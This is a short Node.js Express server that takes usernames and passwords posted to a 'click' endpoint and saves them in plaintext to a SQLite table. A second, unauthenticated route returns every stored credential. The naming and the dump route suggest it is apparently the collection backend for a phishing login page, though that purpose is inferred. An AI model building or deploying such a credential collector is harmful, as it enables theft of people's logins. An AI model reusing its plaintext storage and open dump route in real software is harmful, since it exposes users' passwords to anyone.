const express = require("express");
const sqlite3 = require("sqlite3").verbose();
const path = require("path");
const app = express();
const port = 3000;

// Middleware to parse JSON request bodies
app.use(express.json());

// Serve static files (for main.html and script.js)
app.use(express.static(path.join(__dirname, "..")));

const dbPath = path.join(__dirname, "clicks.db");
const db = new sqlite3.Database(dbPath);

// Create table if not exists
db.serialize(() => {
  db.run(`
    CREATE TABLE IF NOT EXISTS clicks (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT,
      password TEXT,
      timestamp TEXT
    )
  `);
});

// Root route
app.get("/", (req, res) => {
  res.send("Backend server is running ✅");
});

// Click API: Save username, password, timestamp
app.post("/api/click", (req, res) => {
  const { username, password } = req.body;
  const timestamp = new Date().toISOString();

  if (!username || !password) {
    return res.status(400).json({ message: "Username and password required." });
  }

  db.run(
    "INSERT INTO clicks (username, password, timestamp) VALUES (?, ?, ?)",
    [username, password, timestamp],
    function (err) {
      if (err) {
        return res.status(500).json({ message: "Database error." });
      }
      res.json({ message: "Login data saved successfully!" });
    }
  );
});

app.get("/api/clicks", (req, res) => {
  db.all("SELECT username, password, timestamp FROM clicks", [], (err, rows) => {
    if (err) {
      return res.status(500).json({ message: "Database error." });
    }
    res.json(rows);
  });
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
